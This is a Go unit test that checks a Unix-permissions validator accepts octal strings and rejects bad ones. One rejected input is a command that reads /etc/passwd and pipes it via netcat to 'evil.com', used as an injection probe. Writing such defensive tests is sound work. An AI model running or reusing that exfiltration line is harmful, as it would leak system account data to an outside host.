//go:build unit

/*
Copyright 2026 Infinidat
Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at
http://www.apache.org/licenses/LICENSE-2.0
Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package helper

import (
	"testing"
)

// TestChmodVolume tests that ChmodVolume() will handle invalid unixPermission parameters.
func TestValidateUnixPermissions(t *testing.T) {
	tests := []struct {
		unixPermissions string
		wanterr         string
	}{
		{"0", ``},
		{"0000", ``},
		{"644", ``},
		{"0777", ``},
		{"0778", `Invalid Unix permissions [0778]. Must be uint32 in octal format. Error: strconv.ParseUint: parsing "0778": invalid syntax`},
		{"778", `Invalid Unix permissions [778]. Must be uint32 in octal format. Error: strconv.ParseUint: parsing "778": invalid syntax`},
		{"-123", `Invalid Unix permissions [-123]. Must be uint32 in octal format. Error: strconv.ParseUint: parsing "-123": invalid syntax`},
		{"cat /etc/passwd > nc evil.com passwd", `Invalid Unix permissions [cat /etc/passwd > nc evil.com passwd]. Must be uint32 in octal format. Error: strconv.ParseUint: parsing "cat /etc/passwd > nc evil.com passwd": invalid syntax`},
	}

	for _, test := range tests {
		err := ValidateUnixPermissions(test.unixPermissions)
		if !ErrorContains(err, test.wanterr) {
			t.Errorf(`ValidateUnixPermissions("%s") has err: %s`, test.unixPermissions, err)
		}
	}
}
